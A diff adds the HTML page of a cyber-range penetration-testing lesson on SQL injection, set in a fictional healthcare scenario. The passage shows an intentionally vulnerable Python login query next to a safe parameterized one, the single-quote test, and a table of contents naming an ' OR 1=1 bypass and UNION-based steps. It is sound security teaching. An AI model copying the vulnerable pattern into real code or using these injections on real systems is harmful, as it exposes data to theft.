@@ -1,0 +1,1716 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Web application penetration testing exercises for OpenCyberRange">
+      
+      
+      
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.2">
+    
+    
+      
+        <title>Exercise 10B: SQL Injection to Shell - Web Application Penetration Testing</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css?v=4">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="red" data-md-color-accent="pink">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#exercise-10b-sql-injection-to-shell" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Web Application Penetration Testing" class="md-header__button md-logo" aria-label="Web Application Penetration Testing" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Web Application Penetration Testing
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Exercise 10B: SQL Injection to Shell
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="red" data-md-color-accent="pink"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="red" data-md-color-accent="pink"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Web Application Penetration Testing" class="md-nav__button md-logo" aria-label="Web Application Penetration Testing" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Web Application Penetration Testing
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH W1 -- Web Reconnaissance
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH W1 -- Web Reconnaissance
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB01_Web_Reconnaissance/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB01_Web_Reconnaissance/01_Basic_Directory_Enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise W1.1 -- Basic Directory Enumeration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB01_Web_Reconnaissance/02_Technology_Identification/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise W1.2 -- Technology Identification
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB01_Web_Reconnaissance/03_HTTP_Methods_Enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise W1.3 -- HTTP Methods Enumeration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB01_Web_Reconnaissance/04_Header_Analysis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise W1.4 -- Header Analysis
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB01_Web_Reconnaissance/05_Subdomain_Discovery/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise W1.5 -- Subdomain Discovery
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB01_Web_Reconnaissance/06_Comprehensive_Web_Reconnaissance/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise W1.6 -- Comprehensive Web Reconnaissance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB01_Web_Reconnaissance/07_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH W2 -- Web Exploitation
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH W2 -- Web Exploitation
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB02_Web_Exploitation/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB02_Web_Exploitation/01_Basic_SQL_Injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise W2.1 -- Basic SQL Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB02_Web_Exploitation/02_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#before-you-begin" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Before You Begin
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#scenario" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Scenario
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#your-objectives" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Your Objectives
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#network-layout" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Network Layout
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#background-sql-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Background: SQL Injection
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Background: SQL Injection">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#why-sql-injection-exists" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Why SQL Injection Exists
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#how-a-login-query-works" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        How a Login Query Works
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#detecting-sql-injection-the-single-quote-test" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Detecting SQL Injection: The Single Quote Test
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#classic-bypass-or-11-" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Classic Bypass: ' OR 1=1-- -
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#union-based-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        UNION-Based Injection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#determining-the-column-count" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Determining the Column Count
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-full-attack-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The Full Attack Flow
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exercise-10a-vs-10b-two-paths-past-the-login-form" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exercise 10A vs 10B: Two Paths Past the Login Form
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tool-primer-curl-for-form-submission" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tool Primer: curl for Form Submission
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Tool Primer: curl for Form Submission">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#mysql-cli-review-from-exercise-10a" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        MySQL CLI (Review from Exercise 10A)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#walkthrough" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Walkthrough
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Walkthrough">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-1-launch-the-exercise" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 1: Launch the Exercise
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2-browse-the-main-site-and-check-robotstxt" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 2: Browse the Main Site and Check robots.txt
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-3-run-gobuster-to-confirm-hidden-paths" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 3: Run gobuster to Confirm Hidden Paths
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-4-access-the-hidden-portal" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 4: Access the Hidden Portal
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-5-test-for-sql-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 5: Test for SQL Injection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-6-craft-a-union-based-sql-injection-payload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 6: Craft a UNION-Based SQL Injection Payload
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-7-access-the-dashboard-and-collect-token-1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 7: Access the Dashboard and Collect Token 1
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-8-extract-database-credentials-from-the-dashboard" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 8: Extract Database Credentials from the Dashboard
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-9-connect-to-mysql-and-retrieve-token-2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 9: Connect to MySQL and Retrieve Token 2
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#record-your-findings" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Record Your Findings
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-10-interpret-the-results" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 10: Interpret the Results
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-11-assemble-and-submit-the-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 11: Assemble and Submit the Flag
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#analysis-questions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Analysis Questions
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#key-takeaways" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Key Takeaways
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="exercise-10b-sql-injection-to-shell">Exercise 10B: SQL Injection to Shell</h1>
+<h2 id="before-you-begin">Before You Begin</h2>
+<p>Exercise 10A introduced directory enumeration, hidden portals, default credentials, and database pivoting. Those skills carry forward into this exercise, but the entry point is different. Instead of logging in with a default password, you will bypass the login entirely by exploiting a SQL injection vulnerability in the authentication form.</p>
+<p>SQL injection is one of the most impactful web application vulnerabilities. It has appeared in the OWASP Top 10 every year since the list was created, and it remains a leading cause of data breaches. Exercise 10B teaches you how SQL injection works, how to identify it, and how to exploit it using UNION-based techniques to extract data from a backend database.</p>
+<p>Your VPN must be connected and your terminal ready before continuing.</p>
+<h2 id="scenario">Scenario</h2>
+<p>Vertex Healthcare is a regional healthcare technology company headquartered in Denver, Colorado. They provide electronic health record (EHR) integration services to over 40 clinics and hospitals across the western United States.</p>
+<p>Your firm, Blackridge Security, has been engaged to perform a web application penetration test ahead of their upcoming HIPAA compliance review. Your point of contact, Rachel Nguyen (Director of IT Security), shared the following brief: "We recently deployed a new patient portal for provider authentication. The development team says it is production-ready, but I want your team to verify before we open it to all partner clinics. The portal should not be publicly accessible; it is supposed to be behind our VPN."</p>
+<p>The engagement scope covers the web application on the target host and any backend services you discover on the subnet. Rachel mentioned they run a MySQL database on a separate server for the portal backend.</p>
+<p>An assessment token has been split across the environment. Collect both parts and combine them as <code>OCR{________}</code> to complete the engagement.</p>
+<h2 id="your-objectives">Your Objectives</h2>
+<ul>
+<li>Enumerate the web application and discover hidden paths via robots.txt and directory brute-forcing</li>
+<li>Identify a login form vulnerable to SQL injection</li>
+<li>Craft a UNION-based SQL injection payload to bypass authentication</li>
+<li>Extract database credentials from the authenticated dashboard</li>
+<li>Connect directly to the backend MySQL database and retrieve the assessment flag</li>
+</ul>
+<h2 id="network-layout">Network Layout</h2>
+<p>The lab environment contains two target servers on the same subnet:</p>
+<table>
+<thead>
+<tr>
+<th>Server</th>
+<th>Role</th>
+<th>Port</th>
+<th>IP Offset</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Web Application</td>
+<td>Nginx + Flask patient portal</td>
+<td>80</td>
+<td>.16</td>
+</tr>
+<tr>
+<td>Database Server</td>
+<td>MySQL 8.0 backend</td>
+<td>3306</td>
+<td>.37</td>
+</tr>
+</tbody>
+</table>
+<p>Both servers are reachable from your attacker machine. The web application connects to the database internally, but the database also accepts direct connections from the subnet; a segmentation failure you will exploit in the final phase.</p>
+<hr />
+<h2 id="background-sql-injection">Background: SQL Injection</h2>
+<h3 id="why-sql-injection-exists">Why SQL Injection Exists</h3>
+<p>Web applications store data in databases. When a user submits a login form, searches for a product, or updates their profile, the application translates that action into a SQL query and sends it to the database. The vulnerability arises when developers build these queries by pasting user input directly into the SQL string rather than using safe mechanisms that keep data separate from code.</p>
+<p>The pattern is not a rare oversight. SQL injection was first documented in 1998 and remains in the OWASP Top 10 over twenty-five years later (currently <strong>A03:2021: Injection</strong>). It persists because the vulnerable pattern is the simplest way to write database queries, and developers under deadline pressure often ship it without realizing the risk.</p>
+<h3 id="how-a-login-query-works">How a Login Query Works</h3>
+<p>When you submit a username and password to a login form, the application typically runs a query like this:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">id</span><span class="p">,</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="p">,</span><span class="w"> </span><span class="n">email</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;alice&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">password</span><span class="o">=</span><span class="s1">&#39;secretpass&#39;</span>
+</code></pre></div>
+<p>The database checks whether any row matches both the username and password. If a row is returned, the application considers the login successful. If no rows match, the login fails.</p>
+<p>The vulnerability arises when the application builds this query using string formatting:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c1"># VULNERABLE -- user input inserted directly into the query string</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="n">query</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;SELECT id, username, password, email FROM users WHERE username=&#39;</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">&#39; AND password=&#39;</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s2">&#39;&quot;</span>
+</code></pre></div>
+<p>Whatever the user types in the username field gets pasted directly into the SQL statement. If the user types a normal username, the query works as intended. But if the user types SQL syntax, the query structure changes, and the database executes the modified query without question.</p>
+<p>Compare this to the safe approach:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1"># SAFE -- parameterized query keeps data separate from code</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span>
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>    <span class="s2">&quot;SELECT id, username, password, email FROM users WHERE username=</span><span class="si">%s</span><span class="s2"> AND password=</span><span class="si">%s</span><span class="s2">&quot;</span><span class="p">,</span>
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>    <span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="p">)</span>
+</code></pre></div>
+<p>With parameterized queries, the database treats the username and password as data values, never as part of the SQL syntax. Even if the user submits SQL commands, they are interpreted as a literal string to search for.</p>
+<h3 id="detecting-sql-injection-the-single-quote-test">Detecting SQL Injection: The Single Quote Test</h3>
+<p>The simplest test for SQL injection is typing a single quote (<code>'</code>) into an input field. If the application is vulnerable, the single quote closes the string delimiter early and breaks the SQL syntax:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">id</span><span class="p">,</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="p">,</span><span class="w"> </span><span class="n">email</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;&#39;&#39; AND password=&#39;</span><span class="n">anything</span><span class="err">&#39;</span>
+</code></pre></div>
+<p>The three consecutive quotes create a parsing error. Depending on how the application handles errors, you may see:</p>
+<ul>
+<li>A <strong>database error message</strong> displayed on the page (most obvious sign)</li>
+<li>A <strong>different response</strong> compared to a normal failed login (the page looks different, returns a different status code, or takes noticeably longer)</li>
+<li>The application <strong>crashes or returns a 500 error</strong></li>
